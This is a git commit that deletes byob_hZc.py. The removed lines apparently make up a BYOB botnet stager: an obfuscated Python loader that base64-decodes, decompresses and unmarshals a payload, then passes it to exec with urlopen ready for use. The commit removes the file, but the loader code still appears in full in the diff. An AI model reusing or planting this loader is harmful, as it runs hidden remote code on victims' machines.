a7c5fc08d74f2f028b12f0e99c5c2456f84dca90
Subhodeep Neogi <subhodeepneogi16@gmail.com>
2025-04-03 22:41:14 +0530

    Delete byob_hZc.py

--- byob_hZc.py
+++
@@ -1,5 +0,0 @@
-import sys,zlib,base64,marshal,json,urllib
-if sys.version_info[0] > 2:
-    from urllib import request
-urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWJgYCgtyskvSM3TUM8oKSmw0tc3MdUzNDTSMzIx0DOzMjQ2ttDXLy5JTE8tKtbPiErWK6hU19QrSk1M0dAEAC74EeU=')))))
